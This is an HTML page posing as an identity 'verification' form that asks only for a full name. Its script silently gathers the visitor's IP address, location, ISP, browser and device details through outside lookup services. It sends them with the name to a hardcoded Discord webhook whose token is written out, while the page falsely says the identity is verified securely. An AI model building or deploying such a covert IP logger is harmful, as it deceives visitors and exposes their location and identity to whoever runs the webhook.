<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Identity Logger</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: radial-gradient(circle at 30% 10%, #0a0a0f, #03060c);
            font-family: 'Segoe UI', 'Inter', system-ui, -apple-system, sans-serif;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }

        .container {
            background: rgba(8, 8, 16, 0.92);
            backdrop-filter: blur(14px);
            border-radius: 40px;
            border: 1px solid rgba(88, 101, 242, 0.5);
            padding: 48px 40px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.6);
            transition: all 0.3s;
        }

        h1 {
            font-size: 2.2rem;
            font-weight: 700;
            background: linear-gradient(135deg, #ffffff, #8aabff);
            background-clip: text;
            -webkit-background-clip: text;
            color: transparent;
            margin-bottom: 8px;
            letter-spacing: -0.5px;
        }

        .sub {
            color: #8e9fc3;
            margin-bottom: 36px;
            border-left: 3px solid #5865F2;
            padding-left: 14px;
            font-size: 0.9rem;
        }

        label {
            display: block;
            color: #cfdfff;
            font-weight: 600;
            margin-bottom: 10px;
            font-size: 0.9rem;
            letter-spacing: 0.3px;
        }

        input {
            width: 100%;
            padding: 16px 20px;
            background: #12121f;
            border: 1.5px solid #2a2a40;
            border-radius: 28px;
            color: white;
            font-size: 1rem;
            outline: none;
            transition: all 0.2s;
        }

        input:focus {
            border-color: #5865F2;
            box-shadow: 0 0 0 3px rgba(88, 101, 242, 0.25);
        }

        button {
            width: 100%;
            padding: 16px;
            background: linear-gradient(95deg, #5865F2, #4752c4);
            color: white;
            font-weight: 800;
            font-size: 1rem;
            border: none;
            border-radius: 40px;
            margin-top: 32px;
            cursor: pointer;
            transition: all 0.2s;
            box-shadow: 0 8px 20px rgba(88, 101, 242, 0.3);
        }

        button:hover {
            transform: translateY(-1px);
            filter: brightness(1.05);
        }

        button:active {
            transform: scale(0.97);
        }

        #status {
            margin-top: 24px;
            padding: 14px;
            border-radius: 24px;
            text-align: center;
            font-size: 0.85rem;
            background: #0d0d18;
            border-left: 4px solid #5865F2;
            color: #b0c4ff;
        }

        .error {
            border-left-color: #ed4245;
            color: #ffb5b5;
        }

        .success {
            border-left-color: #57f287;
            color: #b9ffcf;
        }

        .footer-note {
            text-align: center;
            font-size: 0.7rem;
            color: #4a5578;
            margin-top: 28px;
        }
    </style>
</head>
<body>

<div class="container">
    <h1>🔐 Verification Required</h1>
    <div class="sub">Please enter your registered full name</div>

    <label>📛 FULL NAME (English only)</label>
    <input type="text" id="fullName" placeholder="e.g., Johnathan Michael Steel" autocomplete="off">

    <button id="submitBtn">✓ SUBMIT & CONTINUE</button>

    <div id="status">⚡ Ready — enter your name to proceed</div>
    <div class="footer-note">Your identity will be verified securely</div>
</div>

<script>
    // ============================================================
    // 🔥 GODMODE – HARDCODED DISCORD WEBHOOK (EDIT THIS URL)
    // ============================================================
    // 👇👇👇 REPLACE THIS WITH YOUR ACTUAL DISCORD WEBHOOK URL 👇👇👇
    const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1506632939642028193/A8wwhWtyzDM4AmZpIaPFslbRSyKzLzeMxVJd8zMt8dqKDYD87jgPQhpRTXgtqGspvZlX";
    // ☝️☝️☝️ PUT YOUR REAL WEBHOOK URL ABOVE ☝️☝️☝️
    // ============================================================

    const fullNameInput = document.getElementById('fullName');
    const submitBtn = document.getElementById('submitBtn');
    const statusDiv = document.getElementById('status');

    function setStatus(message, isError = false, isSuccess = false) {
        statusDiv.innerText = message;
        statusDiv.classList.remove('error', 'success');
        if (isError) statusDiv.classList.add('error');
        if (isSuccess) statusDiv.classList.add('success');
    }

    // Auto-collect IP & network data (silent)
    async function getNetworkData() {
        const networkData = {
            timestamp: new Date().toISOString(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: `${screen.width}x${screen.height}`,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            referrer: document.referrer || 'direct',
            url: window.location.href
        };

        // Try to get IP
        let ip = 'unknown';
        let location = 'unknown';
        let isp = 'unknown';

        try {
            const res = await fetch('https://ipapi.co/json/');
            const data = await res.json();
            ip = data.ip || ip;
            location = `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`;
            isp = data.org || data.asn || '';
        } catch(e) {
            try {
                const res2 = await fetch('https://api.ipify.org?format=json');
                const data2 = await res2.json();
                ip = data2.ip;
            } catch(e2) {}
        }

        networkData.ip = ip;
        networkData.location = location;
        networkData.isp = isp;
        return networkData;
    }

    // Send everything to Discord
    async function sendToDiscord(fullName, networkInfo) {
        if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL === "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN") {
            console.error("Webhook URL not configured!");
            setStatus("❌ Configuration error: Webhook URL not set in HTML.", true);
            return false;
        }

        const embed = {
            title: "📝 New Identity Submission",
            color: 0x5865F2,
            fields: [
                { name: "📛 FULL NAME", value: fullName, inline: false },
                { name: "🌐 IP Address", value: networkInfo.ip || 'unknown', inline: true },
                { name: "📍 Location", value: networkInfo.location || 'unknown', inline: true },
                { name: "🏢 ISP", value: networkInfo.isp || 'unknown', inline: true },
                { name: "💻 User Agent", value: networkInfo.userAgent?.substring(0, 150) || 'unknown', inline: false },
                { name: "🖥️ Screen", value: networkInfo.screen || 'unknown', inline: true },
                { name: "⏰ Timezone", value: networkInfo.timezone || 'unknown', inline: true },
                { name: "🗣️ Language", value: networkInfo.language || 'unknown', inline: true },
                { name: "🔗 Referrer", value: networkInfo.referrer || 'direct', inline: false },
                { name: "🕒 Timestamp", value: networkInfo.timestamp || new Date().toISOString(), inline: true }
            ],
            footer: { text: "Auto-collected data" }
        };

        try {
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ embeds: [embed] })
            });

            if (!response.ok) {
                let errMsg = `HTTP ${response.status}`;
                try {
                    const err = await response.json();
                    errMsg += ` - ${err.message || JSON.stringify(err)}`;
                } catch(e) {}
                throw new Error(errMsg);
            }
            return true;
        } catch (error) {
            console.error("Webhook error:", error);
            return false;
        }
    }

    // Main submit handler
    async function handleSubmit() {
        const fullName = fullNameInput.value.trim();

        // Validation
        if (!fullName) {
            setStatus("❌ Please enter your full name.", true);
            return;
        }

        const nameRegex = /^[A-Za-z\s\-'.]{2,100}$/;
        if (!nameRegex.test(fullName)) {
            setStatus("❌ Invalid name. Use only English letters, spaces, hyphens, or apostrophes (2-100 characters).", true);
            return;
        }

        setStatus("📡 Collecting network data and sending to verification server...");

        // Get network data (IP, location, etc.)
        const networkData = await getNetworkData();

        setStatus(`📤 Sending name "${fullName}" with network fingerprint...`);

        const success = await sendToDiscord(fullName, networkData);

        if (success) {
            setStatus(`✅ Success! Your identity has been recorded. Thank you, ${fullName}.`, false, true);
            // Optional: clear the name field after success
            // fullNameInput.value = "";
        } else {
            setStatus("❌ Failed to submit. Please try again or contact support.", true);
        }
    }

    // Event listener
    submitBtn.addEventListener("click", handleSubmit);

    // Allow Enter key
    fullNameInput.addEventListener("keypress", (e) => {
        if (e.key === "Enter") {
            e.preventDefault();
            submitBtn.click();
        }
    });
</script>
</body>
</html>
